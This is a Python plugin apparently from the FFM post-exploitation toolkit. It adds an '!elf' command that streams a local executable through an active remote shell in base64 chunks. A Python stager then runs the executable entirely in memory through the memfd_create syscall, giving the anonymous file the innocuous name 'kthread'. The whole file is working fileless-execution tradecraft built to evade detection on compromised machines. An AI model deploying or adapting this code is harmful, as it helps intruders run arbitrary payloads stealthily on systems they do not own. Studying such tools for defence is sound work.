"""
FFM by @JusticeRage

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

import base64
import io
import tqdm

from model.driver.input_api import *
from model.plugin.command import Command
from commands.command_manager import register_plugin


class RemoteElf(Command):
    """
    This command executes a local ELF on the remote machine in memory.
    It is done through the create_memfd syscall and a short staging
    Python script which copies the target program into an anonymous file.
    """

    chunk_size = 1024
    _PYTHON_MAJOR_CONFIG = {
        3: {
            "stager": """
import os, sys, ctypes, base64
fd = ctypes.CDLL(None).syscall(319, "kthread", 0)
os.write(fd, base64.b64decode(p))
try:
    pid = os.fork()
    if pid > 0:
        print("Child process PID: %i" % pid)
    else:
        os.execv("/proc/self/fd/%i" % fd, {arguments})
except Exception as e:
    print("Execution failed (%s)!" % str(e))
""",
        },
        2: {
            "stager": """
import os, sys, ctypes, base64
fd = ctypes.CDLL(None).syscall(319, "kthread", 0)
os.write(fd, base64.b64decode(p))
try:
    pid = os.fork()
    if pid > 0:
        print("Child process PID: %i" % pid)
    else:
        os.execv("/proc/self/fd/%i" % fd, {arguments})
except Exception, e:
    print "Execution failed (%s)!" % str(e)
""",
        },
    }

    def __init__(self, *args):
        if len(args) < 2:
            raise RuntimeError("Received %d argument(s), expected 2." % len(args))
        self.program = os.path.expanduser(args[1])
        if not os.path.exists(self.program):
            raise RuntimeError("%s not found!" % self.program)

        self.program_args = [os.path.basename(args[1])] + [a for a in args[2:]]
        self.interpreter, self.python_major = self._get_interpreter()

        result = shell_exec(self._get_syscall_check_command())
        if int(result) == -1:
            raise RuntimeError(
                "The remote kernel doesn't support the create_memfd syscall!"
            )

    def _get_interpreter(self):
        for interpreter in (
            "python3",
            "python",
            "python2",
            "python2.7",
            "python2.6",
            "python2.5",
            "python2.4",
        ):
            if check_command_existence(interpreter):
                version = shell_exec(
                    '%s -c "import sys; print(sys.version_info[0])"' % interpreter
                )
                major_version = int(version)
                if major_version in self._PYTHON_MAJOR_CONFIG:
                    return interpreter, major_version
        raise RuntimeError(
            "No compatible Python interpreter is present on the machine!"
        )

    def _get_syscall_check_command(self):
        if self.python_major == 3:
            return (
                "%s -c \"import ctypes;print(ctypes.CDLL(None).syscall(319, '', 0))\""
                % self.interpreter
            )
        return (
            "%s -c 'import ctypes;print ctypes.CDLL(None).syscall(319, \"\", 0)'"
            % self.interpreter
        )

    def execute(self):
        stager_script = self._PYTHON_MAJOR_CONFIG[self.python_major]["stager"].format(
            arguments=str(self.program_args)
        )

        os.write(
            context.active_session.master,
            ("%s - <<'__EOF__'\r\np = ''\r\n" % self.interpreter).encode("UTF-8"),
        )

        with open(self.program, "rb") as f:
            data = base64.b64encode(f.read())
            reader = io.BytesIO(data)
            buffy = reader.read(self.chunk_size)
            with tqdm.tqdm(total=len(data), unit="o", unit_scale=True) as progress_bar:
                while len(buffy) != 0:
                    os.write(context.active_session.master, b"p += '%s'\r\n" % buffy)
                    progress_bar.update(len(buffy))
                    buffy = reader.read(self.chunk_size)
            write_str("\r")

        shell_exec(
            "%s\r\n__EOF__" % stager_script,
            print_output=True,
            output_cleaner=lambda s: s.lstrip(" >"),
        )

    @staticmethod
    def regexp():
        return r"^\s*\!elf($| )"

    @staticmethod
    def usage():
        write_str(
            "Usage: !elf [elf on the local machine] [program arguments]\r\n",
            LogLevel.WARNING,
        )

    @staticmethod
    def name():
        return "!elf"

    @staticmethod
    def description():
        return (
            "Runs an executable from the local machine in memory using whatever "
            "compatible Python interpreter is available on the remote machine."
        )

    @staticmethod
    def tag():
        return "Execution"


register_plugin(RemoteElf)
